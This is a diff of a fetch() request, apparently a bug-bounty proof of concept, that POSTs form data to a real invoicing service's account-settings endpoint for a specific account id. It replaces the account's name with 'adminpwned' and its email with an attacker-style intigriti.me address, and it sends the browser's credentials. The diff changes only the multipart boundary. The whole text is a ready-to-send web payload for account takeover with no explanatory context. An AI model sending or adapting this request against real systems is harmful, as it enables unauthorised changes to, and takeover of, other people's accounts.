@@ -3,7 +3,7 @@ fetch("https://my.billdu.com/company.settings.accounts.edit/edit/1398707", {
     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
     "accept-language": "en-GB,en;q=0.6",
     "cache-control": "no-cache",
-    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryvqdEyHzFjpgrJKbJ",
+    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryg0dBsPo1SBsd59DI",
     "pragma": "no-cache",
     "priority": "u=0, i",
     "sec-ch-ua": "\"Chromium\";v=\"130\", \"Brave\";v=\"130\", \"Not?A_Brand\";v=\"99\"",
@@ -23,7 +23,7 @@ fetch("https://my.billdu.com/company.settings.accounts.edit/edit/1398707", {
   },
   "referrer": "https://my.billdu.com/company.settings.accounts.edit/edit/1398707",
   "referrerPolicy": "strict-origin-when-cross-origin",
-  "body": "------WebKitFormBoundaryvqdEyHzFjpgrJKbJ\r\nContent-Disposition: form-data; name=\"btnSave\"\r\n\r\nSave\r\n------WebKitFormBoundaryvqdEyHzFjpgrJKbJ\r\nContent-Disposition: form-data; name=\"fullname\"\r\n\r\nadminpwned\r\n------WebKitFormBoundaryvqdEyHzFjpgrJKbJ\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\nhack3r_0@intigriti.me\r\n------WebKitFormBoundaryvqdEyHzFjpgrJKbJ\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n\r\n------WebKitFormBoundaryvqdEyHzFjpgrJKbJ\r\nContent-Disposition: form-data; name=\"signatureImage\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryvqdEyHzFjpgrJKbJ\r\nContent-Disposition: form-data; name=\"_do\"\r\n\r\nform-form-submit\r\n------WebKitFormBoundaryvqdEyHzFjpgrJKbJ--\r\n",
+  "body": "------WebKitFormBoundaryg0dBsPo1SBsd59DI\r\nContent-Disposition: form-data; name=\"btnSave\"\r\n\r\nSave\r\n------WebKitFormBoundaryg0dBsPo1SBsd59DI\r\nContent-Disposition: form-data; name=\"fullname\"\r\n\r\nadminpwned\r\n------WebKitFormBoundaryg0dBsPo1SBsd59DI\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\nhack3r_0@intigriti.me\r\n------WebKitFormBoundaryg0dBsPo1SBsd59DI\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n\r\n------WebKitFormBoundaryg0dBsPo1SBsd59DI\r\nContent-Disposition: form-data; name=\"signatureImage\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryg0dBsPo1SBsd59DI\r\nContent-Disposition: form-data; name=\"_do\"\r\n\r\nform-form-submit\r\n------WebKitFormBoundaryg0dBsPo1SBsd59DI--\r\n",
   "method": "POST",
   "mode": "cors",
   "credentials": "include"
